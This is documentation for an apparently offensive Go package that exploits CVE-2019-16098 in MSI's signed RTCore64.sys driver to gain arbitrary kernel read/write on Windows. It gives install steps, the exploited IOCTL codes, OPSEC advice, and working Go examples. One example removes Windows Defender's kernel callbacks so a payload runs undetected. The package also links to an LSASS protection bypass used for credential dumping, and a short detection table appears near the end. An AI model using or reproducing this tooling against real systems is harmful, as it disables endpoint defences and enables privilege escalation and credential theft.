---
last_reviewed: 2026-05-04
reflects_commit: 3ccb443
mitre: T1014, T1543.003, T1068
detection_level: very-noisy
---

# BYOVD — RTCore64 (CVE-2019-16098)

[← kernel techniques](README.md) · [docs/index](../../index.md)

**MITRE ATT&CK:** [T1014 — Rootkit](https://attack.mitre.org/techniques/T1014/) +
[T1543.003 — Create or Modify System Process: Windows Service](https://attack.mitre.org/techniques/T1543/003/) +
[T1068 — Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
**Package:** `kernel/driver/rtcore64`
**Platform:** Windows amd64
**Detection:** very-noisy during driver load; moderate steady-state

---

## TL;DR

You need arbitrary kernel read/write from user mode (typically
to bypass LSASS PPL or zero a kernel callback). This package
loads MSI Afterburner's signed RTCore64.sys driver, exploits
its CVE-2019-16098 read/write IOCTL, and exposes
[`kernel/driver.ReadWriter`](https://pkg.go.dev/github.com/oioio-space/maldev/kernel/driver#ReadWriter)
to the consumer.

| You want to… | Use | Constraint |
|---|---|---|
| Get a kernel R/W primitive | [`Install`](#install) | Admin + `SeLoadDriverPrivilege` + driver bytes shipped |
| Read kernel memory | [`ReadKernel`](#readkernel) | After `Install` succeeded |
| Write kernel memory | [`WriteKernel`](#writekernel) | Same |
| Clean up after the op | [`Uninstall`](#uninstall) | Best-effort — deletes service + unregisters driver |

⚠ **HVCI block-list cutoff**: as of 2021-09 Microsoft ships
a driver block-list that includes RTCore64. On HVCI-on hosts
**newer than the block-list update**, the driver load is
refused. Verify via [`Loaded`](#loaded) / catch
`ErrPrivilegeRequired` / probe with a non-destructive read
before relying on this primitive.

⚠ **Driver bytes not bundled** — ship `RTCore64.sys` via
`//go:embed` behind the `byovd_rtcore64` build tag, OR via
`Config.Bytes`. Default builds return `ErrDriverBytesMissing`
to keep the maldev repo free of the signed driver itself.

What this DOES achieve:

- Pre-block-list HVCI hosts: full kernel R/W from user mode
  with one signed driver load.
- LSASS PPL bypass via [`credentials/lsassdump`](../credentials/lsassdump.md)'s
  PPL-flip path (consumes this driver).
- Kernel-callback removal via
  [`evasion/kernel-callback-removal`](../evasion/kernel-callback-removal.md)
  (consumes this driver).

What this does NOT achieve:

- **Stealth driver load** — `NtLoadDriver` + SCM CreateService
  fire kernel callbacks, ETW Microsoft-Windows-Kernel-Process,
  and Defender's "Microsoft-attested driver" detection. Driver
  install IS the loud event; once loaded, IOCTLs are quieter.
- **PatchGuard immunity** — RTCore64's slow-IOCTL pattern
  generally stays below PG's scan thresholds, but kernel
  writes to certain critical structures (KPP-protected
  pages) trigger BSOD on next scan. Tested-safe targets
  documented in the consumer pages.
- **Doesn't survive reboot** — service registration cleaned
  by `Uninstall`. For persistence of kernel R/W, you need a
  different primitive.

---

## Primer

EDR vendors register kernel-mode callbacks (`PsSetCreateProcessNotifyRoutineEx`,
`PsSetCreateThreadNotifyRoutine`, `PsSetLoadImageNotifyRoutine`, …) that
receive every process/thread/image-load event. To remove them — or to
read kernel structures like `EPROCESS.Protection` (LSASS PPL) or
`PspCreateProcessNotifyRoutine[]` — userland needs an arbitrary kernel
read/write primitive.

**BYOVD** (Bring Your Own Vulnerable Driver) sidesteps the
"unsigned drivers don't load on HVCI" wall by abusing a **Microsoft-
attested signed driver** that itself exposes an unauthenticated
arbitrary-r/w IOCTL. RTCore64.sys (MSI Afterburner < 4.6.2.15658) is
the canonical target: signed, widely deployed, and its
CVE-2019-16098 IOCTLs `0x80002048` (read) and `0x8000204C` (write)
take a virtual address + length + buffer with no auth.

The 2021-09-02 Microsoft vulnerable-driver block-list update flagged
RTCore64 — patched HVCI Win10/11 builds refuse to load it. On
unpatched / non-HVCI hosts it still loads and grants kernel read/write
to any caller with `SeLoadDriverPrivilege`.

## Package surface

`kernel/driver/rtcore64` exposes a `Driver` type that implements both
`kernel/driver.ReadWriter` and `kernel/driver.Lifecycle`:

```go
var d rtcore64.Driver
if err := d.Install(); err != nil {       // SCM register + start + open device
    return err
}
defer d.Uninstall()                       // stop + delete + remove dropped binary

buf := make([]byte, 8)
if _, err := d.ReadKernel(0xFFFFF80012345678, buf); err != nil {
    return err                            // IoctlRead at the given VA
}
```

The `Driver` shape-satisfies `evasion/kcallback.KernelReadWriter`, so
it plugs straight into `kcallback.Enumerate` / `kcallback.Remove`
without wrappers.

### Lifecycle steps

1. `loadDriverBytes()` returns the embedded RTCore64.sys bytes (see
   [Driver binary](#driver-binary) below).
2. `dropDriver` writes the bytes to `%WINDIR%\Temp\RTCore64.sys`.
3. `installAndStartService` registers the driver under SCM as a
   `SERVICE_KERNEL_DRIVER` named `RTCore64`, then calls `StartService`.
   `ERROR_ACCESS_DENIED` is mapped to `driver.ErrPrivilegeRequired`.
4. `openDevice` opens `\\.\RTCore64` with `GENERIC_READ | GENERIC_WRITE`.
5. `ReadKernel` / `WriteKernel` issue `DeviceIoControl` against that
   handle. Transfers cap at `MaxPrimitiveBytes = 4096` per IOCTL —
   larger reads/writes loop in the caller, since RTCore64's pool
   transfers are unstable above one page.
6. `Uninstall` closes the handle, stops + deletes the service, and
   removes the dropped file. Best-effort: every step runs even if
   earlier ones failed.

### Driver binary

The package ships **without** the signed RTCore64.sys binary by
default — building with the default tag set yields
`ErrDriverBytesMissing` from `Install()`. To enable real BYOVD
operations:

1. Obtain RTCore64.sys (any version ≤ 4.6.2.15658). Verify the
   signature chain via `signtool verify /v /a` — the leaf cert must
   chain to `Microsoft Windows Hardware Compatibility Publisher`.
2. Drop a sibling file `kernel/driver/rtcore64/embed_byovd_rtcore64_windows.go`
   that overrides `loadDriverBytes()`:

   ```go
   //go:build windows && byovd_rtcore64

   package rtcore64

   import _ "embed"

   //go:embed RTCore64.sys
   var rtcoreBytes []byte

   func loadDriverBytes() ([]byte, error) { return rtcoreBytes, nil }
   ```

3. Build with `go build -tags=byovd_rtcore64`. The resulting binary
   embeds the signed driver; default builds don't.

This split keeps the open-source repo free of MSI's licensed binary
while still shipping every other piece of the BYOVD chain — the
service-install plumbing, IOCTL wrappers, and lifecycle management
all live in source-tree code.

## API Reference

Package: `kernel/driver/rtcore64` ([pkg.go.dev](https://pkg.go.dev/github.com/oioio-space/maldev/kernel/driver/rtcore64))

### `type Driver`

- godoc: zero-value-usable handle to the RTCore64 device. Survives Install / Uninstall cycles within the same process; not safe for concurrent use across goroutines (the kernel handle is single-owner).
- Description: composite that holds the SCM service handle + the open device handle. Implements `kernel/driver.ReadWriter` and `kernel/driver.Lifecycle`, so it plugs straight into `evasion/kcallback` and `credentials/lsassdump` without adapter glue.
- Side effects: `Install` drops a binary on disk, registers an SCM service, opens a device handle. `Uninstall` undoes all three.
- OPSEC: the device path `\\.\RTCore64` is in every EDR's known-IOC list. Renaming the dropped file is cosmetic — the IOCTL device path is hard-coded inside the driver binary.
- Required privileges: admin (`SeLoadDriverPrivilege`).
- Platform: Windows amd64. On other GOOS the type still exists via `rtcore64_stub.go` and every method returns `driver.ErrNotImplemented`.

### `(*Driver).Install() error`

- godoc: drops RTCore64.sys to `%WINDIR%\Temp`, registers it as a kernel-mode SCM service, starts it, and opens the device. Idempotent on success — calling twice without an intervening `Uninstall` is undefined.
- Description: the full BYOVD bring-up sequence in one call. On failure each step rolls back the prior ones (file delete → service delete → handle close).
- Parameters: none.
- Returns: `nil` on success; `ErrDriverBytesMissing` when built without `-tags=byovd_rtcore64`; `driver.ErrPrivilegeRequired` when SCM rejects the open or start call with `ERROR_ACCESS_DENIED`; wrapped error otherwise.
- Side effects: writes `%WINDIR%\Temp\RTCore64.sys`; creates SCM service `RTCore64`; opens `\\.\RTCore64`. All three steps are logged by Microsoft-Windows-Kernel-General + Microsoft-Windows-Services ETW providers.
- OPSEC: very-noisy during this single call. The `NtLoadDriver` event is the loudest; service registration is second. Steady-state IOCTL traffic is comparatively quiet.
- Required privileges: admin with `SeLoadDriverPrivilege` enabled.
- Platform: Windows amd64.

### `(*Driver).Uninstall() error`

- godoc: closes the device handle, stops + deletes the SCM service, removes the dropped binary. Best-effort: every step runs even if earlier ones failed; the first error is returned but cleanup continues.
- Description: the inverse of `Install`. Safe to call on a zero-value `Driver` (no-op, returns `nil`).
- Parameters: none.
- Returns: `nil` if every cleanup step succeeded, the first wrapped error otherwise.
- Side effects: removes the SCM service, deletes `%WINDIR%\Temp\RTCore64.sys`, closes the device handle. Service-deletion event visible to ETW.
- OPSEC: leaves a "service deleted" trail — operators who want to mask uninstall can defer this past the kill chain's noisy phase or skip it entirely (cost: dropped binary stays on disk).
- Required privileges: admin (same as Install).
- Platform: Windows amd64.

### `(*Driver).Loaded() bool`

- godoc: reports whether the device handle is open. Cheap pre-check before issuing IOCTLs.
- Description: tests `d.device != 0`. Does not validate that the kernel-side service is still running.
- Parameters: none.
- Returns: `true` after a successful `Install`, `false` before / after `Uninstall` / on the stub build.
- Side effects: none.
- OPSEC: pure local check; no syscall.
- Required privileges: none.
- Platform: every GOOS (the stub returns `false`).

### `(*Driver).ReadKernel(addr uintptr, buf []byte) (int, error)`

- godoc: issues `IOCTL_RTCORE64_READ` against the open device, reading `len(buf)` bytes from kernel virtual address `addr`. The transfer must fit in a single IOCTL (`MaxPrimitiveBytes` cap); larger reads loop in the caller.
- Description: arbitrary kernel read. Accepts any kernel VA — the driver does no bounds checking, so a bad address page-faults the kernel (BSOD risk).
- Parameters: `addr` — kernel virtual address to read from; `buf` — destination slice, length determines bytes requested.
- Returns: number of bytes read (always `len(buf)` on success), wrapped error otherwise. Returns `driver.ErrNotLoaded` if `Loaded() == false`. Returns a "transfer too large" error when `len(buf) > MaxPrimitiveBytes`.
- Side effects: one `DeviceIoControl` call. ETW: Microsoft-Windows-Kernel-IO with the `RTCore64` device path.
- OPSEC: every `DeviceIoControl(\\.\RTCore64, 0x80002048, ...)` is a strong IOC — the IOCTL code is in public PoCs verbatim. Mitigation: minimise call count (read once into a large staging buffer, then parse in userland).
- Required privileges: admin (the device handle was opened with `GENERIC_READ|GENERIC_WRITE` during Install).
- Platform: Windows amd64.

### `(*Driver).WriteKernel(addr uintptr, data []byte) (int, error)`

- godoc: arbitrary kernel write — IOCTL `IoctlWrite` against the open device. Same single-IOCTL constraint as ReadKernel.
- Description: writes `len(data)` bytes from `data` to kernel VA `addr`. The driver performs no validation — operators must verify the target is writable kernel memory before calling, or the system bugchecks.
- Parameters: `addr` — kernel virtual address to write to; `data` — source bytes.
- Returns: number of bytes written, wrapped error otherwise. Same not-loaded / size-cap errors as `ReadKernel`.
- Side effects: one `DeviceIoControl` call. Whatever kernel structure was overwritten now has the new value — typical use is NULL-ing a callback slot or flipping `EPROCESS.Protection`.
- OPSEC: writes are loaded toward catastrophe — a wrong target BSODs. The IOCTL code `0x8000204C` is in every public PoC.
- Required privileges: admin.
- Platform: Windows amd64.

### Constants

- `ServiceName` — `"RTCore64"`. The SCM key under which the service registers. EDR vendors detect on this exact string; renaming the dropped file does not change it.
- `DevicePath` — `\\.\RTCore64`. The DOS device the driver creates. Hard-coded in the driver binary; cannot be changed by the operator.
- `IoctlRead` / `IoctlWrite` — `0x80002048` / `0x8000204C`. The two IOCTL codes the user-mode primitives invoke. Public CVE-2019-16098 PoCs all use these exact codes.
- `MaxPrimitiveBytes` — `4096`. Per-IOCTL transfer cap. Larger transfers must loop in the caller; RTCore64's pool transfers are unstable above one page.

### Errors

- `ErrDriverBytesMissing` — returned by `Install` when built without `-tags=byovd_rtcore64`. Signals the operator must obtain RTCore64.sys, drop a tagged embed file, and rebuild (see [Driver binary](#driver-binary) above).
- `driver.ErrNotImplemented` — returned by every method on the non-Windows / non-tagged stub build.
- `driver.ErrPrivilegeRequired` — returned when SCM rejects the open or start call (token lacks `SeLoadDriverPrivilege`, or HVCI / vulnerable-driver block-list refused the load).
- `driver.ErrNotLoaded` — returned by `ReadKernel` / `WriteKernel` when invoked before `Install` or after `Uninstall`.

## Advanced — looping reads beyond the per-IOCTL cap

A single IOCTL caps at `MaxPrimitiveBytes` (4096 bytes). Larger reads
loop in the caller — the driver's pool-buffer transfer is unstable
above one page:

```go
package main

import (
	"fmt"

	"github.com/oioio-space/maldev/kernel/driver"
	"github.com/oioio-space/maldev/kernel/driver/rtcore64"
)

// readKernel issues IOCTLs in <=MaxPrimitiveBytes chunks and concatenates
// the results. Bails on the first error so the caller can decide whether
// to retry from the partial offset.
func readKernel(rw driver.Reader, addr uintptr, size int) ([]byte, error) {
	out := make([]byte, 0, size)
	for off := 0; off < size; {
		chunk := size - off
		if chunk > rtcore64.MaxPrimitiveBytes {
			chunk = rtcore64.MaxPrimitiveBytes
		}
		buf := make([]byte, chunk)
		n, err := rw.ReadKernel(addr+uintptr(off), buf)
		if err != nil {
			return out, fmt.Errorf("read @0x%X (off=%d): %w", addr+uintptr(off), off, err)
		}
		out = append(out, buf[:n]...)
		off += n
	}
	return out, nil
}

func main() {
	var d rtcore64.Driver
	if err := d.Install(); err != nil { panic(err) }
	defer d.Uninstall()

	// Read 32 KiB starting at some kernel VA — 8 IOCTLs under the hood.
	bytes, err := readKernel(&d, 0xFFFFF80012345000, 32*1024)
	fmt.Printf("read=%d err=%v\n", len(bytes), err)
}
```

## Composed — RTCore64 + kcallback enumeration + selective Remove

The whole point of `kernel/driver/rtcore64` is to back a `driver.ReadWriter`
that downstream packages consume. `evasion/kcallback` is the canonical
consumer — given the driver, enumerate every PspCreate/Thread/LoadImage
notify routine and selectively neutralize an EDR's callbacks:

```go
package main

import (
	"fmt"
	"log"

	"github.com/oioio-space/maldev/evasion/kcallback"
	"github.com/oioio-space/maldev/kernel/driver/rtcore64"
)

func main() {
	// 1. Bring up the driver.
	var d rtcore64.Driver
	if err := d.Install(); err != nil { log.Fatal(err) }
	defer d.Uninstall()

	// 2. Operator-supplied OffsetTable for the current ntoskrnl build
	//    (derived offline from a PDB dump — see kernel-callback-removal.md).
	tab := kcallback.OffsetTable{
		Build:                   19045,
		CreateProcessRoutineRVA: 0xC1AAA0,
		CreateThreadRoutineRVA:  0xC1AC20,
		LoadImageRoutineRVA:     0xC1AB40,
		ArrayLen:                64,
	}

	// 3. Enumerate.
	cbs, err := kcallback.Enumerate(&d, tab)
	if err != nil { log.Fatal(err) }

	// 4. Selectively NULL-out every EDR-driver-owned slot. Restore on exit
	//    so the host doesn't notice tampering after a benign payload.
	var tokens []kcallback.RemoveToken
	for _, cb := range cbs {
		fmt.Printf("[%s][%d] %s @ 0x%X enabled=%v\n",
			cb.Kind, cb.Index, cb.Module, cb.Address, cb.Enabled)
		if cb.Module == "WdFilter.sys" || cb.Module == "MsSecCore.sys" {
			tok, err := kcallback.Remove(cb, &d)
			if err != nil { log.Printf("remove %s[%d]: %v", cb.Kind, cb.Index, err); continue }
			tokens = append(tokens, tok)
		}
	}
	defer func() {
		for _, tok := range tokens {
			_ = kcallback.Restore(tok, &d)
		}
	}()

	// ... payload runs here without EDR callbacks firing ...
}
```

The same `&d` plugs into `credentials/lsassdump.Unprotect` for a PPL
LSASS dump — see [LSASS Credential Dump](../collection/lsass-dump.md)
for that composition.

## Detection

| Phase | Signal |
|---|---|
| Drop | New file write to `%WINDIR%\Temp\RTCore64.sys` |
| SCM install | `CreateService` with `SERVICE_KERNEL_DRIVER` + name `RTCore64` |
| Driver load | `NtLoadDriver` event, `Microsoft-Windows-Kernel-General` ETW |
| IOCTL | `DeviceIoControl` against `\\.\RTCore64` with codes `0x80002048` / `0x8000204C` (every public PoC uses these exact codes) |

Detection drops to **Medium** once steady-state because the driver is
signed, but the device name is in every EDR's known-IOC list. Renaming
the dropped file does not help — the IOCTL device path is hard-coded
inside RTCore64.sys.

## References

- [CVE-2019-16098](https://nvd.nist.gov/vuln/detail/CVE-2019-16098)
- [Bishop Fox — RTCore64 BYOVD analysis](https://bishopfox.com/blog/lockfile-and-signed-drivers)
- [Microsoft vulnerable-driver block list](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules)

## See also

- [Kernel BYOVD area README](README.md)
- [`evasion/kcallback`](../evasion/kernel-callback-removal.md) — major consumer of the kernel R/W primitive
- [`credentials/lsassdump`](../credentials/lsassdump.md) — uses the kernel R/W to flip lsass.exe out of PPL
